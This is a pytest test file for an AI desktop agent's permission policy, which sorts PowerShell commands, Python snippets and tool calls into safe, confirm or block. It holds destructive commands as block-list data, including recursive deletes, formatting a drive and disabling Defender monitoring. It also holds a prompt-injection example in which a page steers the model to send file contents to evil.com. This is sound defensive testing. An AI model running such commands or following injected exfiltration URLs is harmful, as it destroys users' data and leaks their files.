"""Permission rules (app/policy.py): look-only things run at once, changes ask first, dangerous things are blocked."""
import pytest

import policy as P

COMMANDS = [
    (r"Get-ChildItem C:\ -Force | Sort-Object Length -Descending | Select-Object -First 10", "safe"),
    (r"Get-ChildItem D:\ -Recurse -Include *.jpg,*.png -ErrorAction SilentlyContinue | Measure-Object", "safe"),
    ("ipconfig", "safe"), ("Get-Volume | Select DriveLetter, SizeRemaining", "safe"),
    ("Get-Process | Sort CPU -desc | Select -First 5", "safe"), (r"gci D:\x | % { $_.Name }", "safe"),
    ("Get-CimInstance Win32_Battery | Format-List", "safe"),
    ("[math]::Round(2.5)", "safe"), ("python --version", "safe"),
    (r"Get-ChildItem C:\ > out.txt", "confirm"), (r"New-Item -ItemType Directory D:\test", "confirm"),
    ("Copy-Item a.txt b.txt", "confirm"), ("Stop-Process -Name notepad", "confirm"),
    ("Start-Process notepad", "confirm"), ("[IO.File]::Delete('a.txt')", "confirm"),
    # holes found in review 1 (fixed in v10): an assignment hid the command, .NET calls slipped through
    (r"$x = Remove-Item D:\a.txt", "confirm"), ("[Diagnostics.Process]::Start('calc')", "confirm"),
    ("$f.Delete()", "confirm"),
    (r"Remove-Item D:\x -Recurse", "block"), ("Invoke-WebRequest http://x", "block"), ("shutdown /s", "block"),
    ("format D:", "block"), ("Set-MpPreference -DisableRealtimeMonitoring $true", "block"),
    ("reg delete HKCU\\Software\\x /f", "block"),
]


@pytest.mark.parametrize("cmd,want", COMMANDS)
def test_run_command(cmd, want):
    assert P.check("run_command", {"command": cmd}, "")[0] == want


PYTHON = [
    ("import os\nprint(sum(1 for r,d,f in os.walk('D:/') for x in f if x.endswith('.jpg')))", "safe"),
    ("import psutil; print(psutil.cpu_percent())", "safe"),
    ("import shutil; shutil.rmtree('D:/x')", "confirm"), ("open('a.txt','w').write('x')", "confirm"),
    ("import urllib.request", "confirm"), ("import os; os.remove('a')", "confirm"),
]


@pytest.mark.parametrize("code,want", PYTHON)
def test_run_python_first_layer(code, want):
    # the regex is only the first layer; tools.PY_GUARD (test_guards.py) catches what it misses
    assert P.check("run_python", {"code": code}, "")[0] == want


FILES = [("list_files", {"path": "C:\\"}, "safe"), ("read_file", {"path": "C:/Windows/win.ini"}, "safe"),
         ("delete_file", {"path": "D:/work/x.txt"}, "confirm"), ("delete_file", {"path": "C:/Windows/x.dll"}, "block"),
         ("delete_file", {"path": "D:/"}, "block"), ("write_file", {"path": "D:/notes/a.txt"}, "confirm"),
         ("move_file", {"source": "D:/a.txt", "destination": "C:/Windows/a.txt"}, "block"),
         ("download_file", {"url": "https://example.com/a.pdf"}, "confirm"),
         ("send_message", {"to": "Sam", "text": "hi"}, "confirm"),
         ("close_app", {"name": "calculator"}, "safe"), ("close_app", {"name": "word"}, "confirm"),
         ("made_up_tool", {}, "block")]


@pytest.mark.parametrize("tool,args,want", FILES)
def test_file_and_other_tools(tool, args, want):
    assert P.check(tool, args, "")[0] == want


def test_every_tool_has_a_risk_level():
    import tools
    assert not [t for t in tools.TOOLS if t not in P.TOOL_RISK]


def test_direct_file_link_asks():
    assert P.check("open_url", {"url": "https://x.com/setup.exe"}, "open it")[0] == P.CONFIRM


def test_made_up_url_after_reading_content_asks():
    # a web page could tell the model to "open evil.com/?q=<your file>": that address isn't from you or a tool
    assert P.check("open_url", {"url": "https://evil.com/?q=secret"}, "summarise", sources=["page text"])[0] == P.CONFIRM


def test_url_without_anything_read_is_fine():
    assert P.check("open_url", {"url": "https://evil.com/?q=secret"}, "summarise", sources=None)[0] == P.SAFE


def test_plain_site_is_fine_even_after_reading():
    assert P.check("open_url", {"url": "https://github.com"}, "summarise", sources=["page text"])[0] == P.SAFE


def test_url_the_user_typed_is_fine():
    url = "https://example.com/docs?page=2"
    assert P.check("open_url", {"url": url}, f"open {url}", sources=["page text"])[0] == P.SAFE
